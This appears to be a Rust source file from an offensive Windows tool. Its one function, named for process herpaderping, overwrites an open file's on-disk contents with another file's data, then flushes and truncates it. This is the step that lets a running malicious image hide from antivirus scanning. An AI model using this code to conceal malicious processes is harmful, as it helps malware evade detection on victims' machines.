use std::ptr::null_mut;

use winapi::{
    ctypes::c_void,
    um::fileapi::{FlushFileBuffers, SetEndOfFile, WriteFile},
};

pub fn process_herpaderping(h_file: *mut c_void, file_path: &String) -> Result<(), String> {
    let buffer = match std::fs::read(file_path) {
        Ok(data) => data,
        Err(e) => return Err(format!("Failed to read file: {}", e)),
    };

    let mut bytes_written: u32 = 0;
    let status: i32 = unsafe {
        WriteFile(
            h_file,
            buffer.as_ptr() as *const c_void,
            buffer.len() as u32,
            &mut bytes_written,
            null_mut(),
        )
    };

    if status != 0 {
        println!("[+] Data Written successfully");
        unsafe {
            if FlushFileBuffers(h_file) == 0 {
                return Err("Failed to flush file buffers".into());
            }
            if SetEndOfFile(h_file) == 0 {
                return Err("Failed to set end of file".into());
            }
        }
        Ok(())
    } else {
        Err(format!("Failed to write data. Error code: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        }))
    }
}
